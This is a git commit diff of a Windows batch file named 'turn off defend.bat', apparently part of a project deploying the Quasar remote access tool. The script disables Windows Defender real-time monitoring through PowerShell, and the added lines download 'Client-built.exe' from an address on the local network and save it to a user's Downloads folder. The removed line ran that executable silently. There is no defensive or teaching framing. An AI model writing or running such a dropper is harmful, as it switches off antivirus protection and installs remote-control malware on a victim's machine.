0388703eb374b183521a6354f6445a512c4b0939
Joshua Daniel <85048311+joshuadaniel-8090@users.noreply.github.com>
2024-03-22 14:34:15 +0530

    online quasar download from bat

--- turn off defend.bat
+++ turn off defend.bat
@@ -1,3 +1,12 @@
 @echo off
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-start /wait C:Users\mca1\Downloads\Client-built.exe /S
+setlocal
+
+rem Set the URL of the file you want to download
+set "url=https://192.168.0.114/Client-built.exe"
+
+rem Set the destination path where you want to save the downloaded file
+set "destination=C:\Users\mca1\Downloads"
+
+rem Use PowerShell to download the file
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
